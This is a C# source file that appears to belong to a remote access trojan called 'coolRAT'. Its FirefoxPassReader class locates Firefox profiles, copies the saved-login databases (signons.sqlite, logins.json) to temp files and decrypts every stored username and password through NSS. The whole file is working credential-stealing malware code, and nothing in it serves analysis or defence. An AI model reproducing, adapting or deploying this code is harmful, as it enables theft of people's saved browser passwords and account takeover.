using coolRAT.Libs.Password_Grabbers;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Slave.Password_Grabbers
{
    public class FirefoxPassReader : IPassReader
    {
        public string BrowserName { get { return "Firefox"; } }

        public Tuple<string, string> ForceUnlockDatabase()
        {
            string temp_signons = Path.GetTempFileName();
            string temp_logins = Path.GetTempFileName();

            string signonsFile = null;
            string loginsFile = null;
            bool signonsFound = false;
            bool loginsFound = false;
            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));

            if (dirs.Length == 0)
                return null;

            foreach (string dir in dirs)
            {
                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }

                // find &quot;logins.json"file
                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }

                if (loginsFound || signonsFound)
                {
                    FFDecryptor.NSS_Init(dir);
                    break;
                }

            }

            if(signonsFound && loginsFound)
            {
                if (File.Exists(temp_signons)) File.Delete(temp_signons);
                if (File.Exists(temp_logins)) File.Delete(temp_logins);
                File.Copy(signonsFile, temp_signons);
                File.Copy(loginsFile, temp_logins);
                return new Tuple<string, string>(temp_signons, temp_logins);
            }
            else if(signonsFound && !loginsFound)
            {
                if (File.Exists(temp_signons)) File.Delete(temp_signons);
                File.Copy(signonsFile, temp_signons);
                return new Tuple<string, string>(temp_signons, null);
            }
            else if(!signonsFound && loginsFound)
            {
                if (File.Exists(temp_logins)) File.Delete(temp_logins);
                File.Copy(loginsFile, temp_logins);
                return new Tuple<string, string>(null, temp_logins);
            }

            return null;
        }

        public IEnumerable<CredentialModel> ReadPasswords()
        {
            List<CredentialModel> result = new List<CredentialModel>();
            Tuple<string, string> db = ForceUnlockDatabase();
            if (db == null) return result;

            if(db.Item1 != null)
            {
                using (var conn = new SQLiteConnection("Data Source=" + db.Item1 + ";"))
                {
                    conn.Open();
                    using (var command = conn.CreateCommand())
                    {
                        command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                        using (var reader = command.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string username = FFDecryptor.Decrypt(reader.GetString(0));
                                string password = FFDecryptor.Decrypt(reader.GetString(1));

                                CredentialModel credential = new CredentialModel
                                {
                                    Username = username,
                                    Password = password,
                                    Url = reader.GetString(2)
                                };

                                if (credential.Url == "" && credential.Username == "" && credential.Password == "") continue;
                                result.Add(credential);
                            }
                        }
                    }
                    conn.Close();
                }
            }
            if(db.Item2 != null)
            {
                FFLogins ffLoginData;
                using (StreamReader sr = new StreamReader(db.Item2))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = JsonConvert.DeserializeObject<FFLogins>(json);
                }

                foreach (LoginData loginData in ffLoginData.logins)
                {
                    string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
                    string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
                    CredentialModel credential = new CredentialModel
                    {
                        Username = username,
                        Password = password,
                        Url = loginData.hostname
                    };

                    if (credential.Url == "" && credential.Username == "" && credential.Password == "") continue;
                    result.Add(credential);
                }
            }

            return result;
        }
    }

    class FFLogins
    {
        public long nextId { get; set; }
        public LoginData[] logins { get; set; }
        public string[] disabledHosts { get; set; }
        public int version { get; set; }
    }

    class LoginData
    {
        public long id { get; set; }
        public string hostname { get; set; }
        public string url { get; set; }
        public string httprealm { get; set; }
        public string formSubmitURL { get; set; }
        public string usernameField { get; set; }
        public string passwordField { get; set; }
        public string encryptedUsername { get; set; }
        public string encryptedPassword { get; set; }
        public string guid { get; set; }
        public int encType { get; set; }
        public long timeCreated { get; set; }
        public long timeLastUsed { get; set; }
        public long timePasswordChanged { get; set; }
        public long timesUsed { get; set; }
    }
}
